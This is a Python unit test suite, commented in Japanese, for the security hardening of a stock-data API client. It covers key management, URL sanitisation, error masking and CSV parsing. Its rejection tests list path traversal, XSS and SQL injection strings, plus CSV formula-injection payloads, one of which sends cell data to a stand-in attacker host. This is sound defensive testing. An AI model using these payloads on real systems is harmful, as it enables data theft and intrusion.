#!/usr/bin/env python3
"""
外部APIクライアントセキュリティテストスイート
Issue #395: 外部APIクライアントのセキュリティ強化

セキュリティ脆弱性の修正テスト:
- APIキー管理のセキュリティ
- URL構築の安全性
- エラーメッセージの機密情報マスキング
- CSVパースの安全性
"""

import asyncio
import os
import sys
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# パスの調整
sys.path.insert(0, str(Path(__file__).parent / "src"))

try:
    from src.day_trade.api.enhanced_external_api_client import (
        APIEndpoint,
        APIProvider,
        DataType,
        EnhancedExternalAPIClient,
        RequestMethod,
        SecureAPIConfig,
        SecureAPIKeyManager,
    )

    # SecurityManagerはオプショナル
    SecurityManager = None
    try:
        from src.day_trade.core.security_manager import SecurityManager
    except ImportError:
        pass
except ImportError as e:
    print(f"インポートエラー: {e}")
    print("基本的なセキュリティテストのみ実行します...")

    # フォールバック用のダミークラス
    class EnhancedExternalAPIClient:
        def __init__(self, config=None):
            self.config = config
            self.request_stats = {"security_blocks": 0, "total_requests": 0}

        def _validate_symbol_input(self, symbol):
            import re

            if not symbol or not isinstance(symbol, str) or len(symbol) > 20:
                return False
            return re.match(r"^[A-Za-z0-9.\-]+$", symbol) is not None

        def _sanitize_url_parameter(self, value, param_name):
            dangerous_patterns = ["../", "<script>", "javascript:"]
            for pattern in dangerous_patterns:
                if pattern in value.lower():
                    raise ValueError(f"危険なパラメータ: {param_name}")
            return value

        def _sanitize_error_message(self, error_message, error_type):
            if any(
                pattern in error_message
                for pattern in ["api_key", "password", "192.168"]
            ):
                return "外部API処理でエラーが発生しました（詳細はシステムログを確認してください）"
            return "外部API処理でエラーが発生しました"

        def get_security_statistics(self):
            return {
                "security_blocks": self.request_stats["security_blocks"],
                "total_requests": self.request_stats["total_requests"],
                "security_block_rate": 0.0,
                "security_config": {"max_url_length": 2048},
            }

    class SecureAPIConfig:
        def __init__(self):
            self.enable_input_sanitization = True
            self.enable_output_masking = True
            self.max_url_length = 2048

    class SecureAPIKeyManager:
        def __init__(self, security_manager=None):
            pass

        def get_api_key(self, provider):
            return "test_key_123"


class TestSecureAPIKeyManager(unittest.TestCase):
    """セキュアAPIキー管理テスト"""

    def setUp(self):
        """テストセットアップ"""
        self.security_manager = MagicMock()
        self.key_manager = SecureAPIKeyManager(self.security_manager)

    def test_get_api_key_from_security_manager(self):
        """SecurityManagerからのAPIキー取得テスト"""
        # SecurityManagerのモック設定
        self.security_manager.get_api_key.return_value = "test_api_key_12345"

        # テスト実行
        result = self.key_manager.get_api_key("alpha_vantage")

        # 検証
        self.assertEqual(result, "test_api_key_12345")
        self.security_manager.get_api_key.assert_called_once_with("AV_API_KEY")

    @patch.dict(os.environ, {"AV_API_KEY": "env_test_key_67890"})
    def test_get_api_key_from_environment(self):
        """環境変数からのAPIキー取得テスト"""
        # SecurityManagerがNoneの場合
        key_manager = SecureAPIKeyManager(None)

        # テスト実行
        result = key_manager.get_api_key("alpha_vantage")

        # 検証
        self.assertEqual(result, "env_test_key_67890")

    def test_api_key_validation_short_key(self):
        """短すぎるAPIキーの検証テスト"""
        with patch.dict(os.environ, {"AV_API_KEY": "short"}):
            key_manager = SecureAPIKeyManager(None)
            result = key_manager.get_api_key("alpha_vantage")
            self.assertIsNone(result)

    def test_api_key_validation_long_key(self):
        """長すぎるAPIキーの検証テスト"""
        long_key = "x" * 600  # 500文字超過
        with patch.dict(os.environ, {"AV_API_KEY": long_key}):
            key_manager = SecureAPIKeyManager(None)
            result = key_manager.get_api_key("alpha_vantage")
            self.assertIsNone(result)

    def test_api_key_validation_invalid_format(self):
        """不正な形式のAPIキーの検証テスト"""
        with patch.dict(os.environ, {"AV_API_KEY": "invalid<>key!@#"}):
            key_manager = SecureAPIKeyManager(None)
            # 基本取得は成功（形式検証は別のレイヤーで実行）
            result = key_manager.get_api_key("alpha_vantage")
            self.assertEqual(result, "invalid<>key!@#")

    def test_api_key_cache(self):
        """APIキーキャッシュ機能テスト"""
        self.security_manager.get_api_key.return_value = "cached_key_123"

        # 初回呼び出し
        result1 = self.key_manager.get_api_key("alpha_vantage")

        # 2回目呼び出し（キャッシュから取得）
        result2 = self.key_manager.get_api_key("alpha_vantage")

        # 検証: 両方とも同じ結果、SecurityManagerは1回のみ呼び出し
        self.assertEqual(result1, "cached_key_123")
        self.assertEqual(result2, "cached_key_123")
        self.security_manager.get_api_key.assert_called_once()


class TestSecureURLBuilder(unittest.TestCase):
    """セキュアURL構築テスト"""

    def setUp(self):
        """テストセットアップ"""
        config = SecureAPIConfig()
        self.client = EnhancedExternalAPIClient(config)

    def test_safe_url_parameter_sanitization(self):
        """安全なURLパラメータのサニタイゼーションテスト"""
        # 正常なパラメータ
        result = self.client._sanitize_url_parameter("AAPL", "symbol")
        self.assertEqual(result, "AAPL")

        result = self.client._sanitize_url_parameter("2024-01-01", "date")
        self.assertEqual(result, "2024-01-01")

    def test_dangerous_url_parameter_detection(self):
        """危険なURLパラメータの検出テスト"""
        dangerous_inputs = [
            "../etc/passwd",
            "..\\windows\\system32",
            "%2e%2e/etc/shadow",
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "<script>alert('hack')</script>",
            "'OR 1=1--",
            "file:///etc/passwd",
        ]

        for dangerous_input in dangerous_inputs:
            with self.assertRaises(ValueError):
                self.client._sanitize_url_parameter(dangerous_input, "symbol")

    def test_parameter_length_limits(self):
        """パラメータ長制限テスト"""
        # 長すぎるパラメータ
        long_param = "A" * 300
        with self.assertRaises(ValueError):
            self.client._sanitize_url_parameter(long_param, "symbol")

    def test_symbol_format_validation(self):
        """株式コード形式検証テスト"""
        # 正常な株式コード
        valid_symbols = ["AAPL", "MSFT", "BRK.A", "TSM-TW"]
        for symbol in valid_symbols:
            result = self.client._sanitize_url_parameter(symbol, "symbol")
            # URLエンコード後の結果を確認
            self.assertIsNotNone(result)

        # 不正な株式コード
        invalid_symbols = ["AAPL<script>", "MSFT'DROP", "TEST@#$"]
        for symbol in invalid_symbols:
            with self.assertRaises(ValueError):
                self.client._sanitize_url_parameter(symbol, "symbol")


class TestSecureInputValidation(unittest.TestCase):
    """セキュアな入力検証テスト"""

    def setUp(self):
        """テストセットアップ"""
        config = SecureAPIConfig()
        self.client = EnhancedExternalAPIClient(config)

    def test_valid_symbol_input(self):
        """有効な株式コード入力テスト"""
        valid_symbols = ["AAPL", "MSFT", "GOOGL", "AMZN", "TSLA"]
        for symbol in valid_symbols:
            result = self.client._validate_symbol_input(symbol)
            self.assertTrue(result)

    def test_invalid_symbol_input(self):
        """無効な株式コード入力テスト"""
        invalid_symbols = [
            "",  # 空文字
            None,  # None
            "A" * 25,  # 長すぎる
            "AAPL<script>",  # HTMLタグ
            "MSFT'DROP",  # SQLインジェクション試行
            "TEST/../../etc",  # パストラバーサル試行
            "SYMBOL\x00NULL",  # ヌルバイト
        ]

        for symbol in invalid_symbols:
            result = self.client._validate_symbol_input(symbol)
            self.assertFalse(result)

    def test_request_params_validation(self):
        """リクエストパラメータ検証テスト"""
        # 正常なパラメータ
        valid_params = {
            "symbol": "AAPL",
            "start_date": "2024-01-01",
            "end_date": "2024-12-31",
            "interval": "daily",
        }
        result = self.client._validate_request_params(valid_params)
        self.assertTrue(result)

        # 不正なパラメータ
        invalid_params_sets = [
            {"invalid-key": "value"},  # 不正なキー名
            {"symbol": "A" * 2000},  # 値が長すぎる
            {"symbol": "<script>alert(1)</script>"},  # 危険な文字
            {"symbol": "javascript:alert('xss')"},  # JavaScriptスキーム
        ]

        for invalid_params in invalid_params_sets:
            result = self.client._validate_request_params(invalid_params)
            self.assertFalse(result)


class TestErrorMessageSanitization(unittest.TestCase):
    """エラーメッセージサニタイゼーションテスト"""

    def setUp(self):
        """テストセットアップ"""
        config = SecureAPIConfig()
        self.client = EnhancedExternalAPIClient(config)

    def test_safe_error_messages(self):
        """安全なエラーメッセージテスト"""
        # 一般的なエラーメッセージは変更されない
        safe_message = "Connection timeout"
        result = self.client._sanitize_error_message(safe_message, "TimeoutError")
        self.assertEqual(result, "外部APIからの応答がタイムアウトしました")

    def test_sensitive_info_masking(self):
        """機密情報マスキングテスト"""
        sensitive_errors = [
            "Error accessing file /home/user/.env",  # ファイルパス
            "Failed to connect to 192.168.1.100:8080",  # IPアドレス
            "API key abc123def456ghi789 is invalid",  # APIキー
            "Database connection failed: password=secret123",  # パスワード
            "Token bearer_token_xyz789 expired",  # トークン
            "Email sent to admin@company.com failed",  # メールアドレス
        ]

        for error_msg in sensitive_errors:
            result = self.client._sanitize_error_message(error_msg, "ClientError")
            # 機密情報が含まれる場合は汎用メッセージに変換される
            self.assertIn("詳細はシステムログを確認してください", result)

    def test_internal_error_logging(self):
        """内部エラーログテスト"""
        from unittest.mock import patch

        # APIリクエストのモック作成
        from src.day_trade.api.enhanced_external_api_client import (
            APIEndpoint,
            APIRequest,
        )

        endpoint = APIEndpoint(
            provider=APIProvider.MOCK_PROVIDER,
            data_type=DataType.STOCK_PRICE,
            endpoint_url="https://api.example.com/stocks/{symbol}",
        )
        request = APIRequest(endpoint=endpoint, params={"symbol": "TEST"})

        with patch(
            "src.day_trade.api.enhanced_external_api_client.logger"
        ) as mock_logger:
            self.client._log_internal_error(
                "Sensitive error with API key abc123", "ClientError", request
            )

            # 内部ログが呼び出されることを確認
            mock_logger.error.assert_called_once()
            logged_message = mock_logger.error.call_args[0][0]

            # 機密情報がマスキングされていることを確認
            self.assertNotIn("abc123", logged_message)


class TestCSVSecurityParsing(unittest.TestCase):
    """CSVセキュリティ解析テスト"""

    def setUp(self):
        """テストセットアップ"""
        config = SecureAPIConfig()
        self.client = EnhancedExternalAPIClient(config)

    def test_safe_csv_parsing(self):
        """安全なCSV解析テスト"""
        safe_csv = """Date,Symbol,Open,High,Low,Close,Volume
2024-01-01,AAPL,150.00,155.00,149.00,154.50,1000000
2024-01-02,AAPL,154.50,156.00,153.00,155.75,1200000"""

        result = self.client._parse_csv_response_secure(safe_csv)
        self.assertIsNotNone(result)
        self.assertEqual(len(result), 2)  # 2行のデータ

    def test_csv_size_limits(self):
        """CSVサイズ制限テスト"""
        # 大きすぎるCSV（50MB制限）
        large_csv = "A,B,C\n" + "1,2,3\n" * (50 * 1024 * 1024 // 10)  # 計算上の巨大CSV

        with self.assertRaises(ValueError):
            self.client._parse_csv_response_secure(large_csv)

    def test_csv_line_count_limits(self):
        """CSV行数制限テスト"""
        # 行数が多すぎるCSV（10万行制限）
        header = "Date,Symbol,Price\n"
        many_lines = "2024-01-01,TEST,100.00\n" * 150000  # 15万行
        large_line_csv = header + many_lines

        with self.assertRaises(ValueError):
            self.client._parse_csv_response_secure(large_line_csv)

    def test_dangerous_csv_patterns(self):
        """危険なCSVパターン検出テスト"""
        dangerous_csvs = [
            "=cmd|'/c calc'!A0",  # Excel コマンド実行
            '=HYPERLINK("http://evil.com", "Click me")',  # 悪意のあるリンク
            '=WEBSERVICE("http://attacker.com/steal?data="&A1)',  # データ窃取
            "@SUM(A1:A100)",  # 不正な関数
            "javascript:alert('XSS')",  # JavaScript スキーム
            "<script>alert('CSV injection')</script>",  # スクリプトタグ
            "data:text/html,<img src=x onerror=alert(1)>",  # HTML データスキーム
        ]

        for dangerous_csv in dangerous_csvs:
            csv_content = f"Header\n{dangerous_csv}"
            with self.assertRaises(ValueError):
                self.client._parse_csv_response_secure(csv_content)


class TestSecurityConfiguration(unittest.TestCase):
    """セキュリティ設定テスト"""

    def test_secure_config_defaults(self):
        """セキュア設定デフォルト値テスト"""
        config = SecureAPIConfig()

        # セキュリティ関連設定のデフォルト値確認
        self.assertTrue(config.enable_input_sanitization)
        self.assertTrue(config.enable_output_masking)
        self.assertTrue(config.log_sensitive_errors_internal_only)
        self.assertEqual(config.max_url_length, 2048)
        self.assertEqual(config.max_response_size_mb, 50)
        self.assertTrue(config.enable_request_signing)
        self.assertTrue(config.enable_response_validation)

    def test_security_statistics(self):
        """セキュリティ統計テスト"""
        config = SecureAPIConfig()
        client = EnhancedExternalAPIClient(config)

        # セキュリティブロックを発生させる
        client.request_stats["security_blocks"] = 5
        client.request_stats["total_requests"] = 100

        stats = client.get_security_statistics()

        # セキュリティ統計の確認
        self.assertEqual(stats["security_blocks"], 5)
        self.assertEqual(stats["security_block_rate"], 5.0)
        self.assertIn("security_config", stats)
        self.assertEqual(stats["security_config"]["max_url_length"], 2048)


class APISecurityIntegrationTest(unittest.TestCase):
    """APIセキュリティ統合テスト"""

    def setUp(self):
        """テストセットアップ"""
        self.config = SecureAPIConfig(
            max_concurrent_requests=2,
            cache_ttl_seconds=60,
            enable_input_sanitization=True,
            enable_output_masking=True,
        )
        self.client = EnhancedExternalAPIClient(self.config)

    async def test_security_workflow(self):
        """セキュリティワークフロー統合テスト"""
        await self.client.initialize()

        try:
            # 1. 正常なリクエスト
            response = await self.client.fetch_stock_data(
                "AAPL", APIProvider.MOCK_PROVIDER
            )
            # モックプロバイダーなので実際のAPIコールは発生しない

            # 2. 危険な入力でのセキュリティブロック
            response = await self.client.fetch_stock_data(
                "../etc/passwd", APIProvider.MOCK_PROVIDER
            )
            self.assertIsNone(response)  # セキュリティブロックにより None が返される

            # 3. セキュリティ統計確認
            stats = self.client.get_security_statistics()
            self.assertGreater(stats["security_blocks"], 0)

        finally:
            await self.client.cleanup()

    def test_async_security_workflow(self):
        """非同期セキュリティワークフローテスト"""
        asyncio.run(self.test_security_workflow())


def run_security_test_suite():
    """セキュリティテストスイート実行"""
    print("=== 外部APIクライアントセキュリティテストスイート ===")

    # テストスイート作成
    test_classes = [
        TestSecureAPIKeyManager,
        TestSecureURLBuilder,
        TestSecureInputValidation,
        TestErrorMessageSanitization,
        TestCSVSecurityParsing,
        TestSecurityConfiguration,
        APISecurityIntegrationTest,
    ]

    total_tests = 0
    failed_tests = 0

    for test_class in test_classes:
        print(f"\n{'='*60}")
        print(f"テストクラス: {test_class.__name__}")
        print(f"{'='*60}")

        # テストスイート実行
        suite = unittest.TestLoader().loadTestsFromTestCase(test_class)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)

        # 統計更新
        total_tests += result.testsRun
        failed_tests += len(result.failures) + len(result.errors)

        if result.failures:
            print(f"\n❌ 失敗: {len(result.failures)}件")
            for test, traceback in result.failures:
                failure_msg = traceback.split('AssertionError: ')[-1].split('\n')[0]
                print(f"  - {test}: {failure_msg}")

        if result.errors:
            print(f"\n💥 エラー: {len(result.errors)}件")
            for test, traceback in result.errors:
                error_msg = traceback.split('\n')[-2]
                print(f"  - {test}: {error_msg}")

    # 最終結果
    print(f"\n{'='*80}")
    print("セキュリティテストスイート実行結果")
    print(f"{'='*80}")
    print(f"総テスト数: {total_tests}")
    print(f"成功: {total_tests - failed_tests}")
    print(f"失敗: {failed_tests}")
    print(
        f"成功率: {((total_tests - failed_tests) / total_tests * 100):.1f}%"
        if total_tests > 0
        else "0.0%"
    )

    if failed_tests == 0:
        print("\n✅ 全てのセキュリティテストが成功しました！")
        print("   外部APIクライアントのセキュリティ強化が正常に機能しています。")
    else:
        print(f"\n⚠️  {failed_tests}件のテストが失敗しました。")
        print("   セキュリティ機能の調整が必要です。")

    return failed_tests == 0


if __name__ == "__main__":
    success = run_security_test_suite()
    sys.exit(0 if success else 1)
